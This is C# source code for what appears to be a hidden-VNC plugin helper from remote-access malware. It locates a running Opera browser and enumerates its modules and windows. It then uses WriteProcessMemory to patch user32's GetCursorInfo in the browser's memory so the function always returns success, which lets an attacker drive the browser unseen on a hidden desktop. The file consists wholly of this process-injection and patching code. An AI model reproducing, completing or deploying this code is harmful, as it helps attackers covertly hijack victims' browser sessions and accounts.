

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;


namespace Plugin.Helper
{
	internal class OperaHVNC
	{
		public const uint DESKTOP_ENUMERATE = 1;
		private const uint PROCESS_QUERY_INFORMATION = 1024;
		private const uint PROCESS_VM_READ = 16;
		private const uint PROCESS_VM_OPERATION = 8;
		private const uint PROCESS_ALL_ACCESS = 2035711;
		private const uint PAGE_EXECUTE_READWRITE = 64;

		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(
			uint dwDesiredAccess,
			bool bInheritHandle,
			int dwProcessId);

		[DllImport("psapi.dll", SetLastError = true)]
		public static extern bool EnumProcessModules(
			IntPtr hProcess,
			[Out] IntPtr[] lphModule,
			uint cb,
			out uint lpcbNeeded);

		[DllImport("psapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern uint GetModuleBaseName(
			IntPtr hProcess,
			IntPtr hModule,
			[Out] char[] lpBaseName,
			uint nSize);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool ReadProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			[Out] byte[] lpBuffer,
			int dwSize,
			out int lpNumberOfBytesRead);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hObject);

		[DllImport("user32.dll")]
		private static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool EnumDesktopWindows(
			IntPtr hDesktop,
			OperaHVNC.EnumDesktopWindowsDelegate lpfn,
			IntPtr lParam);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetWindowTextLength(IntPtr hWnd);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			byte[] lpBuffer,
			uint nSize,
			out IntPtr lpNumberOfBytesWritten);

		public static IntPtr GetFunctionAddressInRemoteProcess(
			int processId,
			string dllName,
			string functionName)
		{
			IntPtr num1 = OperaHVNC.OpenProcess(1040U, false, processId);
			if (num1 == IntPtr.Zero)
			{
				Console.WriteLine("Failed to open target process.");
				return IntPtr.Zero;
			}
			IntPtr[] lphModule = new IntPtr[1024];
			uint cb = (uint) (IntPtr.Size * lphModule.Length);
			uint lpcbNeeded;
			if (!OperaHVNC.EnumProcessModules(num1, lphModule, cb, out lpcbNeeded))
			{
				Console.WriteLine("Failed to enumerate process modules.");
				OperaHVNC.CloseHandle(num1);
				return IntPtr.Zero;
			}
			IntPtr zero = IntPtr.Zero;
			char[] lpBaseName = new char[1024];
			for (int index = 0; (long) index < (long) lpcbNeeded / (long) IntPtr.Size; ++index)
			{
				Array.Clear((Array) lpBaseName, 0, lpBaseName.Length);
				int moduleBaseName = (int) OperaHVNC.GetModuleBaseName(num1, lphModule[index], lpBaseName, (uint) lpBaseName.Length);
				string str = new string(lpBaseName).TrimEnd(new char[1]);
				Console.WriteLine("Module found: " + str);
				if (str.Equals(dllName, StringComparison.OrdinalIgnoreCase))
				{
					zero = lphModule[index];
					Console.WriteLine("user32.dll base address: " + zero.ToString());
					break;
				}
			}
			if (zero == IntPtr.Zero)
			{
				Console.WriteLine(dllName + " not found in the target process.");
				OperaHVNC.CloseHandle(num1);
				return IntPtr.Zero;
			}
			IntPtr hModule = OperaHVNC.LoadLibrary(dllName);
			if (hModule == IntPtr.Zero)
			{
				Console.WriteLine("Failed to load " + dllName + " in local process.");
				OperaHVNC.CloseHandle(num1);
				return IntPtr.Zero;
			}
			IntPtr procAddress = OperaHVNC.GetProcAddress(hModule, functionName);
			if (procAddress == IntPtr.Zero)
			{
				Console.WriteLine("Failed to get the address of " + functionName + " in local " + dllName + ".");
				OperaHVNC.CloseHandle(num1);
				return IntPtr.Zero;
			}
			long num2 = (long) procAddress - (long) hModule;
			IntPtr addressInRemoteProcess = (IntPtr) ((long) zero + num2);
			OperaHVNC.CloseHandle(num1);
			Console.WriteLine("Success");
			return addressInRemoteProcess;
		}

		private static bool Is64BitProcess(Process process)
		{
			if (!Environment.Is64BitOperatingSystem)
				return false;
			bool wow64Process;
			OperaHVNC.IsWow64Process(process.Handle, out wow64Process);
			return !wow64Process;
		}

		public Process GetProcessFromhWnd(IntPtr handle)
		{
			try
			{
				uint lpdwProcessId;
				int windowThreadProcessId = (int) OperaHVNC.GetWindowThreadProcessId(handle, out lpdwProcessId);
				return Process.GetProcessById((int) lpdwProcessId);
			}
			catch
			{
			}
			return (Process) null;
		}

		public void ListOperaWindows(IntPtr hDesktop)
		{
			List<IntPtr> numList = new List<IntPtr>();
			OperaHVNC.EnumDesktopWindows(hDesktop, new OperaHVNC.EnumDesktopWindowsDelegate(EnumWindowsCallback), IntPtr.Zero);

            bool EnumWindowsCallback(IntPtr hWnd, IntPtr lParam)
            {
                int windowTextLength = OperaHVNC.GetWindowTextLength(hWnd);
                if (windowTextLength > 0)
                {
                    StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
                    OperaHVNC.GetWindowText(hWnd, stringBuilder, stringBuilder.Capacity);
                    Console.WriteLine("Window title: " + stringBuilder.ToString());
                }
                else
                {
                    Console.WriteLine("No window title found or invalid handle.");
                }
                Process processFromhWnd = this.GetProcessFromhWnd(hWnd);
                if (processFromhWnd != null && processFromhWnd.ProcessName == "opera" && !processFromhWnd.HasExited)
                {
                    Console.WriteLine(processFromhWnd.ProcessName);
                    return false;
                }
                processFromhWnd.Dispose();
                return true;
            }
        }

		public static Process FindMainWindowProcess(Process[] processes)
		{
			foreach (Process process in processes)
			{
				try
				{
					IntPtr mainWindowHandle = process.MainWindowHandle;
					if (mainWindowHandle != IntPtr.Zero)
					{
						StringBuilder lpString = new StringBuilder(OperaHVNC.GetWindowTextLength(mainWindowHandle) + 1);
						OperaHVNC.GetWindowText(mainWindowHandle, lpString, lpString.Capacity);
						Console.WriteLine(string.Format("Process: {0}, Window Title: {1}", (object) process.ProcessName, (object) lpString));
						return process;
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine("Process: " + process.ProcessName + ", Error: " + ex.Message);
				}
			}
			return (Process) null;
		}

		public static void PatchOpera()
		{
			string DllBaseName = "user32.dll";
			string FunctionName = "GetCursorInfo";
			Process[] processesByName = Process.GetProcessesByName("opera");
			if (processesByName.Length == 0)
				return;
			Process mainWindowProcess = OperaHVNC.FindMainWindowProcess(processesByName);
			if (mainWindowProcess == null)
				return;
			IntPtr withRequiredRights = Opera2.GetProcessHandleWithRequiredRights(mainWindowProcess.Id);
			ulong lpBaseAddress = 0;
			try
			{
				lpBaseAddress = Opera2.GetRemoteProcAddress64Bit(withRequiredRights, Opera2.GetRemoteModuleHandle64Bit(withRequiredRights, DllBaseName), FunctionName);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			if (lpBaseAddress == 0UL)
				return;
			byte[] lpBuffer = new byte[6]
			{
				(byte) 184,
				(byte) 1,
				(byte) 0,
				(byte) 0,
				(byte) 0,
				(byte) 195
			};
			OperaHVNC.WriteProcessMemory(withRequiredRights, (IntPtr) (long) lpBaseAddress, lpBuffer, (uint) lpBuffer.Length, out IntPtr _);
		}

		public delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, IntPtr lParam);
	}
}
